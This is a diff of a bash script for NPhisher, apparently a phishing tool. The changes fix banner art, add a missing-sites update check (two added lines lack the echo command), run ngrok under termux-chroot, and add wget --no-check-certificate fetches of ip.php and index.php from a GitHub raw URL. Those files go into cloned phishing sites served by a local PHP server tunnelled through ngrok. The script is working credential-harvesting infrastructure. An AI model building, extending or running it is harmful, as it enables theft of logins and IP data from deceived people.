@@ -60,10 +60,10 @@ cbanner(){
 #Small Banner
 sbanner(){
 	echo " "
-	echo -e "${RED} ▒█▄░ ▒█${BLUE} ▒█▀▀█ ${NC}"
+	echo -e "${RED} ▒█▄  ▒█${BLUE} ▒█▀▀█ ${NC}"
 	echo -e "${RED} ▒█▒█ ▒█${BLUE} ▒█▄▄█ █░░█ ░▀░ █▀▀ █░░█ █▀▀ █▀▀█${NC}"
-	echo -e "${RED} ▒█░░█▒█${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
-	echo -e "${RED} ▒█░░░██${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
+	echo -e "${RED} ▒█░ █▒█${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
+	echo -e "${RED} ▒█░  ██${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
 	echo -e "${CYAN}        ${NC} "
 }
 
@@ -84,12 +84,17 @@ fi
 if [[ -e ".cld.log" ]]; then
         rm -rf ".cld.log"
 fi
+if [[ ! -d ".sites" ]]; then
+        "\n${GREEN}[${WHITE}#${GREEN}]${RED} Sites directory not found..."
+				sleep 5
+				"${GREEN}[${WHITE}#${GREEN}]${RED} Updating the tool..."
+				check_net_update
+fi
 }
 
 #Dependencies
 dependencies() {
-        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing required packages..."
-
+        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Installing required packages..."
     if [[ -d "/data/data/com.termux/files/home" ]]; then
         if [[ `command -v proot` ]]; then
             printf ''
@@ -338,7 +343,7 @@ start_ngrok() {
 	esac
         echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
+        sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     else
         sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     fi
@@ -531,8 +536,20 @@ cusport() {
 setup_site() {
         echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
         cp -rf .sites/"$website"/* .server/www
-				cp .sites/ip.php .sites/"$website"/* .server/www
-				cp .sites/index.php .sites/"$website"/* .server/www
+				if [ -e ".sites/ip.php" ]; then
+					cp .sites/ip.php .sites/"$website"/* .server/www
+				else
+					wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/NPhisher/main/.sites/ip.php
+					mv ip.php .sites
+					cp .sites/ip.php .sites/"$website"/* .server/www
+				fi
+				if [ -e ".sites/index.php" ]; then
+					cp .sites/index.php .sites/"$website"/* .server/www
+				else
+					wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/NPhisher/main/.sites/index.php
+					mv index.php .sites
+					cp .sites/index.php .sites/"$website"/* .server/www
+				fi
 	cusport
         echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
         cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
